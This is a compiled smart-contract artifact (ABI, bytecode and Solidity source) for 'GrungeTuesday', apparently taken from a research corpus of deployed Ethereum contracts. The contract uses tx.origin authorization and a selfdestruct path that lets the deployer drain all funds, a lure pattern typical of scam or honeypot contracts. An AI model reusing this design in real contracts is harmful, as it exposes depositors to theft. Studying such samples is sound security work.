{
  "contractName": "GrungeTuesday",
  "abi": [
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "multi_x",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x6080604052326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561005057600080fd5b50610105806100606000396000f300608060405260043610603f576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063143181e3146041575b005b60476049565b005b3073ffffffffffffffffffffffffffffffffffffffff16313410158060ba57506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163273ffffffffffffffffffffffffffffffffffffffff16145b1560d7573273ffffffffffffffffffffffffffffffffffffffff16ff5b5600a165627a7a723058208eb1d53f4c876e2ec83d578029cc23e910b21a28b0fc00920434714aa45ddbfb0029",
  "source": "\n\ncontract GrungeTuesday\n{\n    address O = tx.origin;\n\n    function() public payable {}\n\n    function multi_x() public payable {\n        if (msg.value >= this.balance || tx.origin == O) {\n            selfdestruct(tx.origin);\n        }\n    }\n }",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x05cd27a978fc9f9919a5f4c5c03e5947ed7d4c4d/contracts/0x05cd27a978fc9f9919a5f4c5c03e5947ed7d4c4d.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:45:04.012Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}